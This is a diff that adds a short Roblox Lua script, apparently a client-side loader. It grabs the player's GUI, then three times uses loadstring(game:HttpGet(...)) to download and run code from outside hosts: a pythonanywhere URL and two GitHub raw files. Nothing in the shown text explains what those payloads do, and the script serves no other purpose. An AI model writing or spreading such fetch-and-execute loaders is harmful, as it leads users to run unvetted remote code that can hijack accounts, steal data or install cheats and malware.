@@ -1,0 +1,13 @@
+local Players = game:GetService("Players")
+local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+
+loadstring(game:HttpGet("https://peeky.pythonanywhere.com/jjs"))()
+
+local targetFrame = PlayerGui:WaitForChild("ScreenGui"):WaitForChild("Frame")
+
+task.wait(0.8)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/d00xy4b14n/Extension1/refs/heads/main/1"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/d00xy4b14n/2/refs/heads/main/2"))()
+end)
